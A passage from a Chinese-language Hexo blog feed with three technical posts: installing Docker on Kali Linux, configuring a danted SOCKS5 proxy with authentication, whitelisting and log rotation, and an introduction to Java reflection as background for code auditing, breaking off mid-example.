    <content type="html"><![CDATA[<p>记录一下kali 2021的docker安装过程</p><p>后续持续更新一些docker常用的命令</p><span id="more"></span><h2 id="安装证书-https-dirmngr">1、安装证书 https dirmngr</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update <br>apt-get install -y apt-transport-https ca-certificates <br>apt-get install dirmngr<br></code></pre></td></tr></table></figure><h2 id="密钥与更新源">2、密钥与更新源</h2><p>echo可能会权限不够，可以先切换到root用户完成该命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br>echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure><h2 id="安装docker">3、安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install docker.io<br></code></pre></td></tr></table></figure><h2 id="用户添加docker组">4、用户添加docker组</h2><p>将kali用户添加至docker组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo usermod -aG docker kali<br></code></pre></td></tr></table></figure><p>添加完之后记得重新登录，比如注销再登录</p><h2 id="检查安装">5、检查安装</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>danted socks5代理服务器配置</title>
    <link href="/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>最近研究了一下如何搭建socks5代理服务器，选择了danted做了一些分析。</p><p>不过danted的官网的配置有些是错的，很多博客说的也不是非常详细，因此自己结合官网说明和实践测试，最后整了一篇文章。</p><h2 id="目标">目标</h2><ol type="1"><li>实现身份认证访问代理服务器</li><li>实现白名单目标服务器访问</li><li>按天分割日志</li></ol><h2 id="danted命令">1、danted命令</h2><h3 id="安装">1.1、安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install dante-server<br></code></pre></td></tr></table></figure><h3 id="运行">1.2、运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start danted.service   // 运行<br>systemctl restart danted.service// 重启<br></code></pre></td></tr></table></figure><h2 id="重要配置解读">2、重要配置解读</h2><p>官网主页：<a href="http://www.inet.no/dante/doc/1.4.x/config/index.html">Dante官方配置</a></p><p>服务器设置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">logoutput日志输出位置，可以使用stdout/文件名<br>注意: danted的日志不支持输出到/var/<span class="hljs-keyword">log</span>目录下，官网的配置文档有误<br> 建议的形式是在根目录下额外开一个/danted目录来做日志文件夹<br>参考链接:https://www.linuxquestions.org/questions/linux-software<span class="hljs-number">-2</span>/dante-socks-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">not</span>-running-<span class="hljs-keyword">as</span>-root-<span class="hljs-keyword">no</span>-<span class="hljs-keyword">access</span>-<span class="hljs-keyword">to</span>-var-<span class="hljs-keyword">log</span><span class="hljs-number">-4175674993</span>/<br><br><span class="hljs-type">internal</span>用于指定代理服务器监听的接口（或地址）和端口。<br>即客户端连接的地址，可以使用IP或者网卡(如eth0)来代指<br><br><span class="hljs-keyword">external</span>用于指定代理服务器向目标服务器发起连接的接口<br>可以使用IP或者网卡名称来指代<br><br>socksmethodsocks代理服务采用的身份认证方式<br><br>clientmethod客户端连接时采用的身份认证（不设置即可）<br><br><span class="hljs-keyword">user</span>.privileged需要使用特权的时候，使用的用户权限<br><span class="hljs-keyword">user</span>.unprivileged 不需要特权的时候，使用的用户权限<br><br></code></pre></td></tr></table></figure><p>流量设置</p><p>client pass，默认采用正向代理方式，控制哪些客户端可以连接（类似防火墙的访问控制列表），一般直接放行即可。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">client pass &#123;<br>        <span class="hljs-keyword">from</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">to</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span><br>        <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> <span class="hljs-comment"># connect disconnect tcpinfo iooperation</span><br>&#125;<br></code></pre></td></tr></table></figure><p>socks pass，默认采用正向代理方式，控制客户端和目标服务器的白名单</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">socks pass &#123;<br>    <span class="hljs-keyword">from</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.166</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <span class="hljs-keyword">to</span>: www.ichunqiu.com<br>    <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> connect disconnect <span class="hljs-comment"># tcpinfo </span><br>&#125;<br></code></pre></td></tr></table></figure><p>日志设置</p><p>在client pass和socks pass中，默认输出的日志是info，不需要额外的设置。</p><p>当然也可以自己选择增加error、connect、disconnect、tcpinfo、iooperation这五个种额外输出。</p><h2 id="配置文件样例">3、配置文件样例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs conf">#日志保存位置<br>errorlog: syslog<br>logoutput: /danted/sockd.log<br><br>#特权&amp;非特权<br>user.privileged: root<br>user.unprivileged: nobody<br><br>internal: 0.0.0.0 port = 1080<br>external: 10.255.200.72<br><br># method: username<br>socksmethod: username<br><br>#允许来自内部的用户访问dante代理服务器<br>client pass &#123;<br>        from: 0.0.0.0/0 to: 0.0.0.0/0<br>        log: error # connect disconnect tcpinfo iooperation<br>&#125;<br><br>#允许访问的外部指定地址<br>socks pass &#123;<br>    from: 192.168.166.0/24 to: www.ichunqiu.com<br>    log: error connect disconnect # tcpinfo <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="日志切割">4、日志切割</h2><p>日志切割采用定时任务完成</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>* * * * /bin/bash -c <span class="hljs-string">&quot;/danted/daily_log.sh&quot;</span><br></code></pre></td></tr></table></figure><p>对应的daily_log.sh的文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置日志文件路径</span><br>log_file=&quot;/danted/sockd.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 获取当前日期</span><br>current_date=$(date +&quot;%Y-%m-%d&quot;)<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置保存目录</span><br>log_dir=&quot;/danted&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 构建新的日志文件名</span><br>new_log_file=&quot;$log_dir/sockd_$current_date.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 检查日志目录是否存在，如果不存在则创建</span><br>if [ ! -d &quot;$log_dir&quot; ]; then<br>    mkdir -p &quot;$log_dir&quot;<br>fi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 判断日志文件是否存在</span><br>if [ -f &quot;$log_file&quot; ]; then<br>    # 备份并重命名日志文件<br>    cp &quot;$log_file&quot; &quot;$new_log_file&quot;<br>    # 清空原日志文件<br>    echo &quot;&quot; &gt; &quot;$log_file&quot;<br>fi<br></code></pre></td></tr></table></figure><h2 id="小尾巴">5、小尾巴</h2><p>当然上面还留了一个问题，danted 的访问控制基于IP而不是用户。danted本身无法根据用户身份实现对目标服务器的访问控制。</p><p>比如我希望A用户只能通行www.baidu.com，B用户只能通行www.qq.com，这个danted目前是做不到的，除非A、B用户的IP是固定的。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理</tag>
      
      <tag>socks5</tag>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计 Java安全基础</title>
    <link href="/2023/09/04/blog0031-1-Java-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/09/04/blog0031-1-Java-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p><p>这一节，将会针对Java SE的基础语法进行说明。网络上已经有很多非常成熟的Java SE的博客，因此这一篇将不会过多关注Java SE开发入门的相关内容。</p><p>这一篇章的重点将会关注在Java安全领域内一些重点概念，例如反射、反序列化等等。</p><span id="more"></span><h1 id="入门博客">1、入门博客</h1><p>Java常见的开发教程非常多，推荐如下：</p><p><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程 Java入门</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰 Java入门教程</a></p><h1 id="基础">2、基础</h1><p>这一部分主要是介绍一些trick，并不涉及非常具体底层的技术细节。</p><h2 id="变量命名">2.1、变量命名</h2><p>很多博客里都不会提到的Java标识符命名规范：</p><ol type="1"><li>可以使用数字、字母、下划线以及<code>$</code>作为变量命名的组成</li><li>不能以数字开头</li><li>区分大小写</li></ol><p>补充这个点主要可以在Java命名<code>$_POST</code>这样的PHP形式变量，感觉非常有意思。</p><h1 id="反射">3、反射</h1><p>反射（Reflection）是 Java 的特征之一，它允许<strong>运行</strong>中的 Java 程序获取自身的信息，并且<strong>可以操作类或对象的内部属性</strong>。简而言之，在<strong>程序在运行期</strong>可以拿到一个对象的所有信息。</p><p>反射在开发中的一个重要体现就是框架的兼容性，框架通过运行中读取配置文件，从而实现不同类的动态加载。</p><h2 id="获取class对象">3.1、获取Class对象</h2><h3 id="class对象简介">3.1.1、Class对象简介</h3><p>在Java中用来表示运行时类型信息的对应类就是Class类，对应于JDK的 java.lang.Class类。Class类被创建后的对象就是<strong>Class对象</strong>，Class对象表示的是自己手动编写类的类型信息，在<strong>Java中每个类都有一个Class对象</strong>。Class对象的信息则会存储在.class文件中。</p><p>当我们new一个对象时，JVM就会将对应的Class对象的信息加载到内存中，然后再根据Class对象创建实例对象或者提供静态变量的引用值。</p><h3 id="类名.class">3.1.2、类名.class</h3><p>假设我们有一个User类，java存在一个内置关键字class表示它的Class对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Class userClass = User.class;<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类方法getclass">3.1.3、类方法getClass</h3><p>类中也存在对应的方法getClass用于获取对应的Class对象的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        Class userClass = user.getClass();<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射机制forname方式">3.1.4、反射机制forName方式</h3><p>我们提到Class对象是Class类的实例，那么在Class类中也存在对应的静态方法forName来实现相应的机制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = Class.forName(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看<code>Class.forName</code>的实现，本质就是通过Reflection来实现对应的Class对象的加载。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229154657831.png" alt="image-20240229154657831" /></p><p><code>Class.forName</code>有两种重载形式</p><ol type="1"><li>name：要加载的类的全名</li><li>initalize：是否初始化类</li><li>loader：类加载器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name, <span class="hljs-keyword">boolean</span> initialize, ClassLoader loader);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name);<br></code></pre></td></tr></table></figure><h3 id="反射机制classloader方式">3.1.5、反射机制classLoader方式</h3><p>通过classLoader的方式，我们利用类加载器获取到相应的Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="获取类的信息">3.2、获取类的信息</h2><h3 id="常用的api">3.2.1、常用的API</h3><p>这里我们列举常见的Class类的方法，用于获取类的信息。</p><p>在用API的时候，有的时候会混乱，建议理清两个点。</p><ol type="1"><li>谁是谁的属性/方法（which belongs to which）</li><li>Field/Method/Class不代表某个单一实例（调用方法，变量修改都是基于实例完成）</li></ol><p>（1）返回类的公有Method</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Class.getMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure><p>（2）返回所有声明的Method类对象，包括公共，保护，默认（包）访问和私有方法，但不包括继承的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure><p>（3）返回已加载类声明的所有public成员变量的Field对象，包括从父类继承过来的成员变量，参数name指定成员变量的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Class.getField(String name)<br></code></pre></td></tr></table></figure><p>（4）返回当前类所有成员变量的Field对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredField(String name)<br></code></pre></td></tr></table></figure><p>（5）返回obj对象的Field属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.get(Object obj) <br></code></pre></td></tr></table></figure><p>（6）向obj对象的这个Field属性设置新值value。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.set(Object obj, Object value) <br></code></pre></td></tr></table></figure><p>（7）返回该Field已声明的修饰符集的整数值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.getModifiers() <br></code></pre></td></tr></table></figure><p>（8）将该Field的值设置为指定obj对象上的int值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.setInt(Object obj, <span class="hljs-keyword">int</span> i)<br></code></pre></td></tr></table></figure><p>（9）<strong>field.setAccessible(boolean flag)</strong></p><p>一般情况下，我们并不能对类的私有字段进行操作，而setAccessible则是<strong>启用和禁用访问安全检查的开关</strong>。flag值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。</p><p>（10）java.lang.reflect.Modifier</p><p>修饰符工具类，提供解码类和成员访问修饰符的静态方法和常量，修饰符集合具有表示不同的修饰符的不同位置的整数。</p><p>（11）java.lang.reflect.Modifier.toString(int modifiers)</p><p>获得修饰符的文本形式</p><h3 id="调用公有方法">3.2.2、调用公有方法</h3><p>假设现在有一个User类，User类定义如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name = <span class="hljs-string">&quot;Tom&quot;</span>;<br>    <span class="hljs-keyword">private</span> String secret = <span class="hljs-string">&quot;cipher&quot;</span>;<br><br>    User(String name)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">setSecret</span><span class="hljs-params">(String secret)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">this</span>.secret = secret;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们使用<code>getMethod</code>方法获取到getName和setName，实现User类的方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        Object invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect get original Name : &quot;</span> + (String)invoke);<br><br>        Method userSetName = userClass.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>        userSetName.invoke(admin, <span class="hljs-string">&quot;admin_new&quot;</span>);<br><br>        invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect set new Name : &quot;</span> + (String)invoke);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="访问私有方法和属性">3.2.3、访问私有方法和属性</h3><p>访问私有方法和属性，我们要注意<code>setAccessible</code>方法，否则我们的操作会受到访问修饰符的限制。</p><p>在公有方法的基础上，我们绕过访问修饰符从而实现反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;original secret : &quot;</span> + (String)secret);<br><br>        Method userSetSecret = userClass.getDeclaredMethod(<span class="hljs-string">&quot;setSecret&quot;</span>, String.class);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSetSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        userSetSecret.invoke(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br><br>        secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;new secret : &quot;</span> + (String)secret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修改属性修饰符">3.2.4、修改属性修饰符</h3><p>Filed对象具有Modifiers属性，用来描述当前Filed表示的属性在类中的修饰符。</p><p>我们可以通过反射获取到secret属性对应的Field对象，再通过反射修改secret Field对象的Modifiers属性，能够通过改变修饰符，影响对应的变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> 